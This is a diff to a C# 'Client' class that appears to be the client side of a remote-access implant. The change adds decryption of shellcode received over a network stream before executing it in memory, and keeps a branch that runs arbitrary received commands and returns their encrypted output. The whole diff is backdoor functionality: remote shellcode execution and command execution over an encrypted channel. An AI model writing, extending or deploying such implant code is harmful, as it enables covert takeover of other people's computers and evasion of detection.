@@ -62,25 +62,32 @@ class Client: IDisposable {
 
                 // shellcode run
                 if (dec == ":shellcode:") {
-                    string raw = rs.ReadLine();
-                    if (string.IsNullOrEmpty(raw) || string.IsNullOrWhiteSpace(raw)) continue;
+                    // get the shellcode
+                    var rawShellCode = rs.ReadLine();
+                    if (string.IsNullOrEmpty(rawShellCode) || string.IsNullOrWhiteSpace(rawShellCode)) continue;
+
+                    // decrypt shellcode
+                    var decryptedData = Utils.DecryptData(Utils.DeserializeData(rawShellCode), iv, key);
+                    if (string.IsNullOrEmpty(decryptedData) || string.IsNullOrWhiteSpace(decryptedData)) continue;
                     
-                    byte[] shellcode = Utils.DeserializeData(raw);
+                    // deserialize the decrypted data to get actuall shellcode in bytes
+                    byte[] shellcode = Utils.DeserializeData(decryptedData);
+
+                    // execute shellcode
                     Utils.ExecuteShellCode(shellcode);
                     ws.WriteLine(Utils.SerializeBytes(Utils.EncryptData("Executing shellcode", iv, key)));
-                    continue;
+                } else {
+                    string[] parts = dec.Split(' ');
+                    string fileName = parts.First();
+
+
+                    string[] args = parts.Skip(1).ToArray();
+
+                    string output = Utils.ExecuteCommand(fileName, args);
+                    var enc = Utils.EncryptData(output.Trim(), iv, key);
+
+                    ws.WriteLine(Utils.SerializeBytes(enc));
                 }
-
-                string[] parts = dec.Split(' ');
-                string fileName = parts.First();
-                
-
-                string[] args = parts.Skip(1).ToArray();
-
-                string output = Utils.ExecuteCommand(fileName, args);
-                var enc = Utils.EncryptData(output.Trim(), iv, key);
-                
-                ws.WriteLine(Utils.SerializeBytes(enc));
             }
         }
     }
